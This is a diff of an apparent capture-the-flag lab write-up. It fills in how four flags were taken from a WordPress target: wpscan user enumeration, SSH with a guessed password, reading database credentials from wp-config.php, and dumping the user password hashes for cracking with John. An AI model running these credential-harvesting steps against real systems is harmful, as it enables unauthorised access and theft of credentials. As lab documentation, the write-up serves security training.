@@ -46,16 +46,25 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
   - `flag1.txt`: ![alt text](https://github.com/Rkelley6045/FinalProject/blob/main/Flags/Flag_1.png "Flag 1")    
     - **Exploit Used**
       - User Enumeration exploit used to scan the WordPress web application to discover usernames of the WordPress site
-      - wpscan --url http://192.168.1.110/wordpress/ --enumerate u
+      - Command run: wpscan --url http://192.168.1.110/wordpress/ --enumerate u
   - `flag2.txt`: ![alt text](https://github.com/Rkelley6045/FinalProject/blob/main/Flags/Flag_2.png "Flag 2")   
     - **Exploit Used**
-      - Used SSH to gain a user shell via the user profile found via the User Enumeration performed to find Flag 1. Found Flag 2 under Micahel's profile in the var/www directory.
-      - ssh Michael@192.168.1.110
+      - Used SSH to gain a user shell via the user profile discover during the User Enumeration exploit. Found Flag 2 under Micahel's profile, after guessing the password, in the var/www directory.
+      - Command run: ssh Michael@192.168.1.110
   - `flag3.txt`: ![alt text](https://github.com/Rkelley6045/FinalProject/blob/main/Flags/Flag_3.png "Flag 3")    
     - **Exploit Used**
-      - _TODO: Identify the exploit used_
-      - _TODO: Include the command run_
+      - Obtained MySQL root credentials in the wp-config.php file via Michael's user profile. Explored the wordpress database to uncover Flag 3 in the WordPress table called wp_posts.  
+      - Command run: cat /var/www/html/wordpress/wp-config.php 
+      - Command run: mysql -u root -p
+      - Command run: show databases;
+      - Command run: use wordpress;
+      - Command run: show tables;
+      - Command run: select * from wp_posts;
   - `flag4.txt`: ![alt text](https://github.com/Rkelley6045/FinalProject/blob/main/Flags/Flag_4.png "Flag 4")    
     - **Exploit Used**
-      - _TODO: Identify the exploit used_
-      - _TODO: Include the command run_
+      - Accessed the WordPress database to abstract the user pw hashes (wp_users table) for both users (Michael and Steven). Exfiltrated the password hashes and ran them agains the password cracker John. 
+      - Command run: use wordpress;      
+      - Command run: show tables;
+      - Command run: select * from wp_users;
+      - Command run: SELECT user_pass FROM wp_users INTO OUTFILE '/home/wp_hases.txt';                  
+       
